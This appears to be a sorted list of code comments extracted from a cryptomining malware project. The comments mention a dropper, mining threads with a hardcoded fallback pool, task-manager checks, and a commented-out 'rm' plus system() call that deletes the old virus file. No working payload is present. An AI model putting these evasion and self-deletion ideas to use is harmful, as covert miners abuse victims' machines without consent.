"//     std::cout << ""false"" << std::endl;"
"//     std::cout << ""true"" << std::endl;"
"// #include ""communication.h"""
"// #include ""tasks.h"""
"// Android (implies Linux, so it must come first)"
"// Debian, Ubuntu, Gentoo, Fedora, openSUSE, RedHat, Centos and other"
"// FreeBSD, NetBSD, OpenBSD, DragonFly BSD"
"// Oracle Solaris, Open Indiana"
"// c.AbortWithStatusJSON(http.StatusBadRequest, ""err"")"
"// const char * command = (x = std::string(""rm "") += std::string(executable_name)).c_str();"
"// std::cout << ""Starting thread to mine ..."" << std::endl;"
// // desalocate memory
// Apple OSX
// Apple OSX and iOS (Darwin)
// Apple iOS
// CHANGE PERMISSION BITS TO CREATE DIRECTORY 
// Could be GUID (windows) / machine-id (linux)
// HP-UX
// IBM AIX
// IF NO INTERNET CONNECTION -> HARDCODED MINING INFO -> POOL ID
// TODO: log if someone is trying to check the api ?
// TODO: refactor this name
// Tasks::check_task_manager();
// Windows
// Windows (Cygwin POSIX under Microsoft Window)
// create directory
// db.Db.Query()
// free(pool);
// free(pool->id);
// free(pool->pool);
// if(Tasks::lock_task_manager){
// indirect
// insert any input into database as json
// remove old virus file.
// std::thread multithreading(Tasks::check_task_manager); // thread creation
// system(command);
// the date that the dropper is executed
// }
// }else{
